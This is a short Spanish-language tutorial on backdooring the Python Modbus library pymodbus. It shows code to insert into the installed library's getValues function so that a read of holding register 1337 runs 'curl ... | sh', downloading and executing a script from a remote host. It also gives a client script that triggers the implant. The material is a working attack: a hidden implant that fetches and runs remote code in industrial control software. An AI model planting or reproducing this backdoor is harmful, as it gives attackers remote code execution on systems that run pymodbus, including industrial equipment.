Para meter un reverse shell en la librería pymodbus basta con modificar los archivos python de la propia librería.

Suelen estar en:

```
/usr/local/lib/python3.10/site-packages/pymodbus/
```

Pero para agregar el implante, podemos meterlo en ```/usr/local/lib/python3.10/site-packages/pymodbus/datastore/context.py``` agregando el texto:

```
if fx == 3 and address == 1337:
  import os
  os.system("curl -s 54484d7b6234636b6430307233645f70796d30646275357d.callmeback.com| sh")
```

...justo debajo de:

```
def getValues(self, fx, address, count=1):
```

...de forma que quede así:

```
    def getValues(self, fx, address, count=1):
      if fx == 3 and address == 1337:
        import os
        os.system("curl -s hack.domain.com | bash")
```

Lógicamente primero habría que detectar la cantidad de espacios que tiene la sangría de la función getValues y la cantidad de espacios que tienen los textos que aparecen debajo de ella, de forma que podamos agregar el implante con la sangría correcta.

Qué hace el implante?

Cada vez que se realiza una lectura (function code 3, es decir, holding register) en la dirección 1337 se ejecuta una línea de terminal. En este caso, la línea es la descarga y ejecución de un script remoto, ubicado en hack.domain.com

Luego podemos disparar el backdoor con este script de python:

```
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
vCliente = ModbusTcpClient('localhost', port=502)
vCliente.connect()
vRespuesta = vCliente.read_holding_registers(address=1337, count=1)
```
print(vRespuesta.registers)
vCliente.close()
